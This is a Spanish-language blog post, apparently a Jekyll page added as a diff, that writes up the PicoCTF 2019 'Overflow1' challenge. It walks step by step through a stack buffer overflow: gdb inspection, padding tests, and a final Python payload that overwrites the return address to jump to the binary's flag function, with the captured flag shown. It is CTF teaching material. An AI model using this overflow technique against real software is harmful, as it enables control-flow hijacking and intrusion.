@@ -1,0 +1,1143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+<link rel="icon" href="/assets/images/lanz2.png">
+
+<title>PicoCTF2019 - Overflow1</title>
+
+<!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>PicoCTF2019 - Overflow1 | Sh0x blog</title>
+<meta name="generator" content="Jekyll v3.8.6" />
+<meta property="og:title" content="PicoCTF2019 - Overflow1" />
+<meta name="author" content="lanz" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Exploraremos un Buffer Overflow pa toda la familia, tendremos que moveremos a una función que contiene la flag." />
+<meta property="og:description" content="Exploraremos un Buffer Overflow pa toda la familia, tendremos que moveremos a una función que contiene la flag." />
+<link rel="canonical" href="http://localhost:4000/article/picoctf19-overflow1" />
+<meta property="og:url" content="http://localhost:4000/article/picoctf19-overflow1" />
+<meta property="og:site_name" content="Sh0x blog" />
+<meta property="og:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/CTF/picoctf/2019/overflow1/overflow1.jpeg" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-03-04T00:00:00-08:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/CTF/picoctf/2019/overflow1/overflow1.jpeg" />
+<meta property="twitter:title" content="PicoCTF2019 - Overflow1" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"lanz"},"dateModified":"2021-03-04T00:00:00-08:00","datePublished":"2021-03-04T00:00:00-08:00","description":"Exploraremos un Buffer Overflow pa toda la familia, tendremos que moveremos a una función que contiene la flag.","headline":"PicoCTF2019 - Overflow1","image":"https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/CTF/picoctf/2019/overflow1/overflow1.jpeg","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/article/picoctf19-overflow1"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/images/sh0x.png"},"name":"lanz"},"url":"http://localhost:4000/article/picoctf19-overflow1"}</script>
+<!-- End Jekyll SEO tag -->
+
+    
+<link href="/assets/css/prism.css" rel="stylesheet">
+
+<link href="/assets/css/theme.css" rel="stylesheet">
+
+<script src="/assets/js/jquery.min.js"></script>
+
+</head>
+
+
+
+
+<body>
+	<!-- defer loading of font and font awesome -->
+	<noscript id="deferred-styles">
+		<link href="https://fonts.googleapis.com/css?family=Sen:400,700&display=swap" rel="stylesheet">
+        <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.0.13/css/all.css" integrity="sha384-DNOHZ68U8hZfKXOrtjWvjxusGo9WQnrNx2sqG0tfsghAvtVlRW3tvkXWZh58N9jp" crossorigin="anonymous">
+	</noscript>
+
+
+<!-- Begin Sidebar Navigation
+================================================== -->
+
+<div class="sidebar">    
+</div>   
+<div class="nav-icon">
+    <div class="hamburger-bar"></div>
+</div>
+<div id="blackover-nav" class="blackover"></div>
+<nav id="menu">
+    <ul>
+        <h3>El tiempo a destiempo</h3>
+        <li><a href="/" style="color: #0ecbe4;">Home</a></li>
+        <li><a href="/categories#article">Artículos</a></li>
+        <li><a href="/categories#htb">HackTheBox</a></li>
+        <li><a href="/about" style="color: rgb(89, 89, 89);">Whoami</a></li>
+    </ul>   
+</nav>
+
+<script src="/assets/js/lunr.js"></script>
+
+<style>
+    
+</style>
+
+<div class="wrap-search">
+    <div class="d-flex align-items-center ml-auto">
+        <i class="fas fa-search show-search"></i>
+        <form class="bd-search ml-3" onSubmit="return lunr_search(document.getElementById('lunrsearch').value);">
+            <input type="text" class="form-control bigradius text-small launch-modal-search" id="lunrsearch" name="q" maxlength="255" value="" placeholder="Escribe y enter :P"/>
+        </form>
+    </div>
+</div>
+
+<div id="lunrsearchresults">
+    <ul></ul>
+</div>
+
+<script src="/assets/js/lunrsearchengine.js"></script>
+
+
+<!-- End Sidebar Navigation
+================================================== -->
+
+<div class="site-content ">
+
+<div class="container">
+
+    <!-- Site Logo/Name
+    ================================================== -->
+   
+    <a class="navbar-brand" href="/">
+        <img src="/assets/images/sh0x.png" alt="Sh0x blog">
+    </a>  
+   
+
+    <!-- Site Tag
+    ================================================== -->
+    
+
+    <!-- Content
+    ================================================== -->
+    <div class="main-content">
+        <div class="entry-header">
+    <!-- Post Title -->
+    <h1 class="posttitle">PicoCTF2019 - Overflow1</h1>
+    <!-- Author & Date  Box -->
+    
+    
+    <div class="d-flex align-items-center mt-4">
+        <div>
+            
+            <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+            
+        </div>            
+        <div>
+        Funk <a targ="_blank" class="text-info">Sh0x</a> el 
+        <span class="post-date"><time class="post-date" datetime="2021-03-04">04 Mar 2021</time></span>           
+        
+        </div>            
+    </div>
+    
+</div>
+
+<!-- Adsense under title if enabled from _config.yml (change your pub id and slot) -->
+
+
+<!-- Featured Image -->
+
+<div class="entry-featured-image">
+    
+    <img class="featured-image " src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/articles/CTF/picoctf/2019/overflow1/overflow1.jpeg" alt="PicoCTF2019 - Overflow1">
+    
+</div>
+
+
+<!-- Content -->
+<!-- Post, Page Content
+================================================== -->
+<div class="article-post">
+    <!-- Toc if any -->
+    
+    <!-- End Toc -->
+    <p>Exploraremos un <code>Buffer Overflow</code> pa toda la familia, tendremos que moveremos a una función que contiene la flag.</p>
+
+<blockquote>
+  <p>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this <a href="https://github.com/lanzt/blog/blob/main/assets/files/articles/CTF/picoctf/2019/overflow1/vuln">program</a>? You can find it in /problems/overflow-1_1_e792baa0d29d24699530e6a26071a260 on the shell server. <a href="https://github.com/lanzt/blog/blob/main/assets/files/articles/CTF/picoctf/2019/overflow1/vuln.c">Source</a>.</p>
+</blockquote>
+
+<h3 id="spanish-writeup">Spanish writeup</h3>
+
+<p>El ejercicio nos dice que debemos lograr cambiar la dirección de retorno y que nos lleve a la función <code>flag</code>.</p>
+
+<p>Ya con los archivos hacemos:</p>
+
+<pre><code class="language-bash">$ file *
+vuln:      ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=5d4cdc8dc51fb3e5d45c2a59c6a9cd7958382fc9, not stripped
+vuln.c:    C source, ASCII text
+</code></pre>
+
+<p>Veamos que hace el programa:</p>
+
+<pre><code class="language-bash">$ ./vuln 
+Give me a string and lets see what happens: 
+hello
+Woah, were jumping to 0x8048705 !
+</code></pre>
+
+<p>Simplemente nos pide un input y nos dice la instrucción a la que hemos saltado. Así que cuando logremos llegar a la función <code>flag</code>, supongo que nos mostrara la dirección.</p>
+
+<p>Source <a href="https://github.com/lanzt/blog/blob/main/assets/files/articles/CTF/picoctf/2019/overflow1/vuln.c">vuln.c</a>.</p>
+
+<pre><code class="language-c">#define BUFFSIZE 64
+#define FLAGSIZE 64
+
+void flag() {
+  char buf[FLAGSIZE];
+  ...
+  fgets(buf,FLAGSIZE,f);
+</code></pre>
+
+<p>Algunos detalles de assembly antes de seguir:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th style="text-align: center">Registro</th>
+      <th style="text-align: center">Arquitectura</th>
+      <th style="text-align: left">Descripción</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td style="text-align: center">eip</td>
+      <td style="text-align: center">32 bits</td>
+      <td style="text-align: left">El registro que almacena la siguiente instrucción a la cual ir</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">rip</td>
+      <td style="text-align: center">64 bits</td>
+      <td style="text-align: left">Instruction pointer register</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">ebp</td>
+      <td style="text-align: center">32 bits</td>
+      <td style="text-align: left">El registro que apunta a una ubicación fija dentro del marco de una función, así sera más fácil acceder a variables y argumentos</td>
+    </tr>
+    <tr>
+      <td style="text-align: center">rbp</td>
+      <td style="text-align: center">64 bits</td>
+      <td style="text-align: left">Base pointer register</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Siguiendo con el fuente, nos encontramos con un <strong>buffer de 64</strong>, haciendo la prueba de fuego:</p>
+
+<pre><code class="language-bash">$ python -c 'print "A"*64' | ./vuln
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x8048705 !
+</code></pre>
+
+<p>Vemos que no pasa nada, ya que los siguientes <code>4 bits</code> guardaran la data que tenga el registro <code>ebp</code> y los siguientes 4 bytes tendrán la dirección de retorno (almacenada en <code>eip</code>).</p>
+
+<ul>
+  <li>Lo explica <a href="https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/">Dhaval Kapil en su brutal articulo</a>.</li>
+</ul>
+
+<p>Sumaremos los <strong>4 bytes del <code>eip</code></strong> y los <strong>4 bytes del <code>ebp</code></strong>, se los agregamos a los <strong>64 del buffer</strong>:</p>
+
+<pre><code class="language-bash">$ python -c 'print "A"*72' | ./vuln
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x8048705 !
+Violación de segmento
+</code></pre>
+
+<p>Obtenemos el overflow, tamos bien.</p>
+
+<p>Saquemos la direccion en memoria de la función <code>flag</code>. Lo podemos hacer con <code>gdb</code>, <code>objdump</code>, <code>ida</code>.. Usa el de preferencia.</p>
+
+<pre><code class="language-bash">$ gdb ./vuln
+info functions
+...
+0x080485e6  flag
+...
+</code></pre>
+
+<p>Un detalle importante para este paso es conocer si nuestro sistema es <a href="http://wikitronica.labc.usb.ve/index.php/Little_Endian_y_Big_Endian">little-endian o big-endian</a>.</p>
+
+<p>Esto decidirá como va a leer nuestro porcesador el programa. Si eres un <code>little-endian</code> (un pequeño indio e.e), entonces debemos colocar la dirección de <code>flag</code> en reverso.</p>
+
+<ul>
+  <li>Ejemplo: <code>0x080485e6  flag</code> entonces pondremos <code>e6</code> <code>85</code> <code>04</code> <code>08</code>.</li>
+</ul>
+
+<pre><code class="language-bash">$ python -c 'print "A"*72 + "\xe6\x85\x04\x08"' | ./vuln
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x8048700 !
+Woah, were jumping to 0x8048705 !
+Violación de segmento
+</code></pre>
+
+<p><strong>¿Por que habrá salido dos veces la instrucción?</strong></p>
+
+<pre><code class="language-bash">$ gdb ./vuln -q
+Reading symbols from ./vuln...
+(No debugging symbols found in ./vuln)
+gdb-peda$ b vuln
+Breakpoint 1 at 0x8048663
+gdb-peda$ r &lt;&lt;&lt; $(python -c 'print "A"*72 + "\xe6\x85\x04\x08"')
+</code></pre>
+
+<p>Continuamos…</p>
+
+<pre><code class="language-bash">gdb-peda$ c
+Continuing.
+Woah, were jumping to 0x8048700 !
+[----------------------------------registers-----------------------------------]
+EAX: 0x22 ('"')
+EBX: 0x41414141 ('AAAA')
+ECX: 0xffffffff 
+EDX: 0xf7fa4010 --&gt; 0x0 
+ESI: 0xf7fa2000 --&gt; 0x1d6d6c 
+EDI: 0xf7fa2000 --&gt; 0x1d6d6c 
+EBP: 0xffffd1b8 --&gt; 0x80485e6 (&lt;flag&gt;:	push   ebp)
+ESP: 0xffffd1b4 ("AAAA\346\205\004\b\005\207\004\b\001")
+</code></pre>
+
+<p>Aún no hemos llegado a la dirección de la función <code>flag</code></p>
+
+<pre><code class="language-bash">Woah, were jumping to 0x8048700 !
+Woah, were jumping to 0x8048705 !
+</code></pre>
+
+<p>Si intentamos <code>"A"*73</code> vemos esto:</p>
+
+<pre><code class="language-bash">$ python -c 'print "A"*73 + "\xe6\x85\x04\x08"' | ./vuln
+Woah, were jumping to 0x8040008 !
+</code></pre>
+
+<p><strong>Hemos cambiado el registro que direcciona!!</strong></p>
+
+<p>Why?</p>
+
+<blockquote>
+  <p>Sencillamente son los <strong>4 bytes</strong> que ocupa la dirección de la función <code>flag</code> que estamos agregando despues de imprimir las <code>"A"</code>.</p>
+</blockquote>
+
+<pre><code class="language-bash">$ python -c 'print "A"*76 + "\xe6\x85\x04\x08"' | ./vuln
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x80485e6 !
+Flag File is Missing. please contact an Admin if you are running this on the shell server.
+</code></pre>
+
+<pre><code class="language-bash">Woah, were jumping to 0x80485e6 !
+</code></pre>
+
+<p>Y ahí lo tenemos, estamos en la dirección de la función <code>flag</code>.</p>
+
+<p>Si lo corremos en el servidor remoto de picoCTF:</p>
+
+<pre><code class="language-bash">pico-2019:/$ python -c 'print "A"*76 + "\xe6\x85\x04\x08"' | ./vuln
+Give me a string and lets see what happens: 
+Woah, were jumping to 0x80485e6 !
+picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}Segmentation fault (core dumped)
+</code></pre>
+
+<h3>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn5a1b468a7}</h3>
+
+<p>Tenemos la flag (: Y hemos corrompido el flujo del programa.</p>
+
+</div>
+
+<!-- Rating -->
+
+
+<!-- Author Box if enabled from _config.yml -->
+<!-- Author Box -->
+
+
+
+
+<!-- Comments if not disabled with comments: false -->
+<!-- Comments
+================================================== -->
+ 
+<div class="comments">
+    <button class="btn btn-dark show-comments">Comentarios</button>         
+    <div id="comments">  
+        <h4 class="mb-4">Comments</h4>                 
+            <section class="disqus">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = 'demowebsite'; 
+        var disqus_developer = 0;
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = window.location.protocol + '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</section>
+     
+    <div class="clearfix"></div>              
+    </div>    
+</div>       
+
+
+<!-- Share -->
+<div class="share">
+    <p>
+        Vacios
+    </p>
+    <ul>
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://twitter.com/intent/tweet?text=PicoCTF2019 - Overflow1&url=http://localhost:4000/article/picoctf19-overflow1" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+                <i class="fab fa-twitter"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://www.hackthebox.eu/profile/73707" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fas fa-cube"></i>
+            </a>
+        </li>
+
+        <li class="ml-1 mr-1">
+            <a target="_blank" href="https://github.com/lanzt" onclick="window.open(this.href, 'width=550,height=435');return false;">
+                <i class="fab fa-github"></i>
+            </a>
+        </li>
+
+    </ul>
+</div>
+
+
+<!-- Related Post -->
+<!-- Related Posts
+================================================== -->
+<div class=" related-posts ">  
+
+    
+    <h2 class="text-center mb-4">Posts relacionados a este (o se hace el intento).</h2>
+    
+    
+    <div class="d-flex justify-content-center align-items-center">
+
+    <!-- Tags -->  
+    
+                    
+    <a class="smoothscroll badge badge-primary" href="/tags#buffer-overflow">buffer-overflow</a>               
+    
+    
+    <!-- Categories -->
+    
+    
+    <a class="smoothscroll badge badge-primary" href="/categories#article">article</a>                
+    
+
+    </div>
+
+    
+    
+    
+    <div class="blog-grid-container">
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/enterprise">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/enterprise/112banner.png" alt="HackTheBox - Enterprise"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/enterprise">HackTheBox - Enterprise</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Linux nivel medio, vamos a movernos entre sentencias SQL para generar pinchazos e.e Pivotearemos entre contenedores y compartiremos experiencias con el host… Finalmente explotaremos un buffer overflow mediante un...</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">10 May 2021</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+            <!-- begin post -->
+
+
+<div class="blog-grid-item">
+    <div class="card h-100">
+        <div class="maxthumb">
+            <a href="/htb/buff">
+                
+
+                    
+                        <img class="img-thumb" src="https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/buff/bannerbuff.png" alt="HackTheBox - Buff"> 
+                    
+
+                
+            </a>
+        </div>
+        <div class="card-body">
+            <h2 class="card-title">
+                <a class="text-dark" href="/htb/buff">HackTheBox - Buff</a>
+                
+            </h2>
+            <h4 class="card-text">Máquina Windows nivel fácil. Buff buff uff, explotaremos un gimnasio :o (casi) yyy aprovecharemos un Buffer Overflow para ser amos del sistema… ¿Sencillo, no? pues…
+
+</h4>
+        </div>
+        <div class="card-footer bg-white">
+            <div class="wrapfooter">
+                
+                <span class="meta-footer-thumb">
+                
+                <img class="author-thumb" src="https://www.gravatar.com/avatar/e56154546cf4be74e393c62d1ae9f9d4?s=250&d=mm&r=x" alt="Sh0x">
+                
+                </span>
+                <span class="author-meta">
+                <span class="post-name"><a target="_blank" href="">Sh0x</a></span> 
+                
+                <span class="post-date">21 Nov 2020</span>
+                </span>
+                <div class="clearfix"></div>
+            </div>
+        </div>
+    </div>
+</div>
+<!-- end post -->
+            
+            
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        
+            
+            
+        
+            
+        
+            
+        
+        
+        </div>        
+</div>
+
+<!-- Review with LD-JSON, adapt it for your needs if you like, but make sure you test the generated HTML source code first: 
+https://search.google.com/structured-data/testing-tool/u/0/
+================================================== -->
+
+    </div>
+
+    
+    <!-- Newsletter
+    ================================================== -->
+    <div class="newsletter text-center">
+        <span class="h4"><img src="/assets/images/sh0x.png" class="newsletter-logo" alt="Sh0x blog"></span>
+        <p></p>
+    </div>
+    
+    
+</div>
+
+<!-- Begin Footer
+================================================== -->
+<footer class="footer">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-6 col-sm-12 text-center text-lg-left">
+                Copyright © 2022 Sh0x blog 
+            </div>
+            <div class="col-md-6 col-sm-12 text-center text-lg-right">    
+                <a target="_blank" href="https://www.wowthemes.net/memoirs-free-jekyll-theme/">Memoirs Jekyll Theme</a> by WowThemes.net
+            </div>
+        </div>
+    </div>
+</footer>
+<!-- End Footer
+================================================== -->
+
+</div> <!-- /.site-content -->
+
+<!-- Scripts (if you need bootstrap.js, please add it yourself. I didn't use it for performance reasons, it was not needed in this theme)
+================================================== -->
+
+<script src="/assets/js/prism.js"></script>
+
+<script src="/assets/js/theme.js"></script>
+
+
+
+
+<script id="dsq-count-scr" src="//demowebsite.disqus.com/count.js"></script>
+
+
+</body>
+</html>
